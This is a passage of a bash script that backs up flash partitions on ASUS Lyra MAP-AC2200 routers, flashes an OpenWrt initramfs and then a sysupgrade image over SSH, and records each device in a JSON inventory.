    if [[ -n "$MTD_INFO" ]]; then
      echo "$MTD_INFO" | tee "${BACKUP_DIR}/mtd-layout.txt"

      # Always backup critical partitions (Factory = calibration data, nvram = MAC/config)
      CRITICAL_PARTS="Factory Factory2 nvram Bootloader"
      for part_name in $CRITICAL_PARTS; do
        part_dev=$(echo "$MTD_INFO" | grep "\"${part_name}\"" | awk '{print $1}' | tr -d ':')
        if [[ -n "$part_dev" ]]; then
          step "  Backing up ${part_dev} (${part_name}) [critical]..."
          eval "$SSH_CMD" "dd if=/dev/${part_dev}ro bs=4096 2>/dev/null" > "${BACKUP_DIR}/${part_dev}-${part_name}.bin" || warn "Failed to backup ${part_dev}"
        fi
      done

      # Optional: backup all other partitions with --full-backup
      if [[ "$FULL_BACKUP" == true ]]; then
        while read -r dev size erase name; do
          [[ "$dev" == mtd* ]] || continue
          name=$(echo "$name" | tr -d '"')
          [[ -f "${BACKUP_DIR}/${dev}-${name}.bin" ]] && continue  # skip already backed up
          step "  Backing up ${dev} (${name})..."
          eval "$SSH_CMD" "dd if=/dev/${dev}ro bs=4096 2>/dev/null" > "${BACKUP_DIR}/${dev}-${name}.bin" || warn "Failed to backup ${dev}"
        done <<< "$MTD_INFO"
      fi

      local backup_count
      backup_count=$(ls -1 "${BACKUP_DIR}"/*.bin 2>/dev/null | wc -l | tr -d ' ')
      step "Backup complete — ${backup_count} partitions saved"
    else
      warn "Could not read /proc/mtd — skipping backup"
    fi
  fi

  # ─── Upload and verify initramfs ────────────────────────────────
  INITRAMFS_BASENAME=$(basename "$INITRAMFS")
  step "Uploading initramfs (${INITRAMFS_BASENAME}, $(ls -lh "$INITRAMFS" | awk '{print $5}') )..."
  eval "$SCP_CMD" "$INITRAMFS" "${USERNAME}@${TARGET_IP}:/tmp/${INITRAMFS_BASENAME}" || die "SCP failed"

  # Verify file actually arrived (stock firmware SCP can silently fail with long names)
  REMOTE_CHECK=$(eval "$SSH_CMD" "ls -la /tmp/${INITRAMFS_BASENAME} 2>/dev/null" 2>/dev/null || true)
  if [[ -z "$REMOTE_CHECK" ]]; then
    warn "SCP reported success but file not found on device — retrying with short filename..."
    eval "$SCP_CMD" "$INITRAMFS" "${USERNAME}@${TARGET_IP}:/tmp/initramfs.itb" || die "SCP failed (short name too)"
    INITRAMFS_BASENAME="initramfs.itb"
    # Re-verify
    REMOTE_CHECK=$(eval "$SSH_CMD" "ls -la /tmp/initramfs.itb 2>/dev/null" 2>/dev/null || true)
    if [[ -z "$REMOTE_CHECK" ]]; then
      die "File not found on device after SCP. Stock firmware /tmp may be full."
    fi
    step "  File uploaded as short name: initramfs.itb"
  fi

  # Verify MD5 on device
  verify_file "$INITRAMFS" \
    "$SSH_CMD 'sha256sum /tmp/${INITRAMFS_BASENAME}'" \
    "initramfs on device"

  # ─── Flash initramfs ────────────────────────────────────────────
  step "Unlocking linux partition..."
  eval "$SSH_CMD" "mtd-unlock -d linux" 2>/dev/null || step "  (mtd-unlock not available or not needed)"

  step "Writing initramfs to linux partition (mtd-write)..."
  eval "$SSH_CMD" "mtd-write -d linux -i /tmp/${INITRAMFS_BASENAME}" || die "mtd-write failed"

  step "Rebooting..."
  eval "$SSH_CMD" "reboot -f" 2>/dev/null || true

  # Guide cable move if needed (Batch 2 devices need middle port for OpenWrt)
  if [[ "$NEED_PORT_SWITCH" == true ]]; then
    step ""
    step "╔═══════════════════════════════════════════════════════════╗"
    step "║  CABLE MOVE REQUIRED before OpenWrt boots!               ║"
    step "║                                                           ║"
    step "║  Move cable from FAR port → MIDDLE port (near power)     ║"
    step "║  OpenWrt always uses middle port as LAN.                  ║"
    step "║                                                           ║"
    step "║  Do this NOW while the device is rebooting.               ║"
    step "╚═══════════════════════════════════════════════════════════╝"
    say_msg "Move the cable to the middle port now. Near the power connector."
    echo ""
    echo "  Press ENTER when cable is moved to middle port..."
    read -r
  fi

  # ─── Wait for OpenWrt initramfs ─────────────────────────────────
  step "Waiting for OpenWrt initramfs to boot (expect 2-5 minutes)..."
  step "  LED sequence: breathing multicolor → blinking blue → steady blue"
  say_msg "Initramfs flashing. Wait for blue LED."

  # Reconfigure interface for OpenWrt subnet
  configure_interface "192.168.1.2"

  sleep 15
  FOUND=0
  for i in $(seq 1 60); do
    if ping -c1 -W2 "$OPENWRT_IP" &>/dev/null; then
      if ssh $SSH_OPTS -o ConnectTimeout=5 "root@${OPENWRT_IP}" 'cat /etc/openwrt_release 2>/dev/null' 2>/dev/null | grep -q "OpenWrt"; then
        step "OpenWrt initramfs is up! (attempt ${i}/${60})"
        say_msg "Initramfs booted successfully."
        FOUND=1
        break
      fi
    fi
    sleep 5
  done

  if [[ "$FOUND" -ne 1 ]]; then
    die "Initramfs did not boot within 5 minutes. Check: (1) cable on MIDDLE port (closest to power)? (2) interface at 192.168.1.2/24? (3) LED state? Batch 2 devices MUST use middle port for OpenWrt."
  fi
fi

# ─── Stage 2: Sysupgrade from OpenWrt initramfs ───────────────────
if [[ "$SKIP_SYSUPGRADE" == true ]]; then
  step "Skipping stage 2 (--skip-sysupgrade)"
  step "OpenWrt initramfs running at ${OPENWRT_IP} (root, no password)"
  exit 0
fi

step "=== STAGE 2: Sysupgrade from OpenWrt initramfs ==="

# Ensure interface is on OpenWrt subnet
configure_interface "192.168.1.2"

step "Verifying OpenWrt SSH access at ${OPENWRT_IP}..."
OPENWRT_RELEASE=$(ssh $SSH_OPTS "root@${OPENWRT_IP}" 'cat /etc/openwrt_release' 2>/dev/null) || die "Cannot SSH to OpenWrt initramfs at ${OPENWRT_IP}. Ensure cable is on LAN port (closest to power)."
echo "$OPENWRT_RELEASE" | grep DISTRIB_RELEASE || die "Not running OpenWrt"

# Verify board name on OpenWrt side too
step "Verifying board identity..."
BOARD=$(ssh $SSH_OPTS "root@${OPENWRT_IP}" 'cat /tmp/sysinfo/board_name' 2>/dev/null || true)
if [[ "$BOARD" == "$EXPECTED_BOARD" ]]; then
  step "  Board verified: ${BOARD} ✓"
else
  die "Board mismatch! Expected '${EXPECTED_BOARD}', got '${BOARD}'. Refusing to sysupgrade."
fi

step "Uploading sysupgrade image..."
SYSUPGRADE_BASENAME=$(basename "$SYSUPGRADE")
scp -O $SSH_OPTS "$SYSUPGRADE" "root@${OPENWRT_IP}:/tmp/${SYSUPGRADE_BASENAME}" || die "SCP sysupgrade failed"

# Verify MD5 on device
  verify_file "$SYSUPGRADE" \
    "ssh $SSH_OPTS root@${OPENWRT_IP} 'sha256sum /tmp/${SYSUPGRADE_BASENAME}'" \
    "sysupgrade on device"

step "Running sysupgrade -n..."
say_msg "Installing permanent OpenWrt. Do not power off."
ssh $SSH_OPTS "root@${OPENWRT_IP}" "sysupgrade -n /tmp/${SYSUPGRADE_BASENAME}" 2>/dev/null || true

step "Waiting for final OpenWrt boot (up to 10 minutes for NAND first boot)..."
say_msg "Rebooting into permanent OpenWrt."
sleep 20

FOUND=0
for i in $(seq 1 90); do
  if ping -c1 -W2 "${OPENWRT_IP}" &>/dev/null; then
    RELEASE=$(ssh $SSH_OPTS -o ConnectTimeout=5 "root@${OPENWRT_IP}" 'cat /etc/openwrt_release 2>/dev/null' 2>/dev/null) || true
    if echo "$RELEASE" | grep -q "OpenWrt"; then
      VER=$(echo "$RELEASE" | grep DISTRIB_RELEASE | cut -d"'" -f2)
      BOARD_FINAL=$(ssh $SSH_OPTS "root@${OPENWRT_IP}" 'cat /tmp/sysinfo/board_name' 2>/dev/null || true)
      step "SUCCESS: OpenWrt ${VER} on ${BOARD_FINAL}"
      say_msg "Flash complete. Open Wrt is running."
      FOUND=1
      break
    fi
  fi
  sleep 5
done

if [[ "$FOUND" -ne 1 ]]; then
  die "Device did not come back after sysupgrade within 7 minutes"
fi

# ─── Collect inventory ─────────────────────────────────────────────
if [[ "$SKIP_INVENTORY" != true ]]; then
  step "=== Collecting inventory ==="

  INVENTORY_MAC=$(ssh $SSH_OPTS "root@${OPENWRT_IP}" 'ip link show eth0 2>/dev/null | grep ether | awk "{print \$2}"' 2>/dev/null | tr -d '[:space:]' || echo "unknown")
  INVENTORY_MAC_FMT=$(echo "$INVENTORY_MAC" | tr ':' '-')

  # Find next inventory sequence number
  INVENTORY_SEQ=$(ls data/inventory-asus-lyra-map-ac2200-*.json 2>/dev/null | grep -o '[0-9]\{3\}\.json' | grep -o '[0-9]\+' | sort -n | tail -1 || echo "0")
  INVENTORY_SEQ=$((INVENTORY_SEQ + 1))
  INVENTORY_FILE="data/inventory-asus-lyra-map-ac2200-$(printf '%03d' $INVENTORY_SEQ).json"

  step "Saving inventory to ${INVENTORY_FILE}..."
  ssh $SSH_OPTS "root@${OPENWRT_IP}" '
    echo "{"
    echo "  \"timestamp\": \"'$(date -u +%Y-%m-%dT%H:%M:%SZ)'\","
    echo "  \"ip\": \"192.168.1.1\","
    echo "  \"state\": \"openwrt_running\","
    echo "  \"identity\": {"
    echo "    \"board\": \"'$(cat /tmp/sysinfo/board_name 2>/dev/null)'\""
    echo "  },"
    echo "  \"firmware\": {"
    cat /etc/openwrt_release | sed "s/^/    /" | sed 's/$/,/'
    echo "    \"kernel\": \"'$(uname -a)'\""
    echo "  },"
    echo "  \"network\": {"
    echo "    \"mac_eth0\": \"'$(ip link show eth0 2>/dev/null | grep ether | awk "{print \$2}")'\""
    echo "  },"
    echo "  \"hardware\": {"
    echo "    \"memory_total_kb\": \"'$(free | grep Mem | awk "{print \$2}")'\""
    echo "  }"
    echo "}"
  ' 2>/dev/null > "$INVENTORY_FILE" || warn "Failed to save inventory JSON"

  # Also collect full hardware info for display
  step "Hardware summary:"
  ssh $SSH_OPTS "root@${OPENWRT_IP}" '
    echo "  Board: $(cat /tmp/sysinfo/board_name 2>/dev/null)"
    echo "  MAC:   $(ip link show eth0 | grep ether | awk "{print \$2}")"
    echo "  WiFi:  $(ls /sys/class/ieee80211/ | tr "\n" " ")"
    echo "  RAM:   $(free -m | grep Mem | awk "{print \$2}") MB"
    echo "  Flash: $(df -h /overlay | tail -1 | awk "{print \$2}") total, $(df -h /overlay | tail -1 | awk "{print \$4}") available"
  ' 2>/dev/null || true

  step "Inventory saved: ${INVENTORY_FILE}"
fi

step "=== DONE ==="
step "Device: ${INVENTORY_MAC:-unknown}"
step "SSH: root@${OPENWRT_IP} (no password)"
step "Backups: ${BACKUP_DIR:-skipped}"
say_msg "Device ${INVENTORY_SEQ} is ready."
